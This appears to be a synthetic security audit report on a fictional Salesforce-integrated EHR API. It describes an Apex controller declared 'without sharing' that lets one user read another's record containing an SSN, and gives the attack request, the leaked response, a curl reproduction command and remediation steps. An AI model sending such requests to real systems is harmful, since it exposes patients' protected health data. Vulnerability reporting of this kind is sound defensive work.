# Security Analysis Report
**System:** PatientCore EHR API (Salesforce-Integrated)
**Domain:** Healthcare / EHR Platform
**Example ID:** SF-0101
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `OpportunityController.getOpportunity` — attacker uses EHR Opportunity controller to read patient PHI records belonging to other users |

---

## Finding 1 — BAC: Functional Pivot on Opportunity Object (Pattern 2.1)

### Summary
The Apex controller `OpportunityController` on PatientCore EHR API (`809bb9e4.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 2.1, the attacker performs a functional pivot — using an Opportunity controller that was not intended for cross-user access — to read any patient's EHR-associated Opportunity record including PHI (SSN), constituting a potential HIPAA violation.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` but the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**HIPAA note:** The `SensitiveData__c` field contains `SSN: 000-46-7904` — in a healthcare/EHR context, exposure of SSN constitutes PHI leakage, a HIPAA breach.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://809bb9e4.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://809bb9e4.lightning.force.com/aura
Authorization: Bearer 00D809BB9E4!AR809bb9e4...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D809BB9E4!AR809bb9e4...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"001B9E4","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity / PHI Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001B9E4", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-46-7904"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D809BB9E4!AR809bb9e4..."
curl -s -X POST "https://809bb9e4.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"001B9E4","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-46-7904 (PHI)
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. Audit all Aura controllers for cross-controller functional pivot risk (BAC Pattern 2.1).
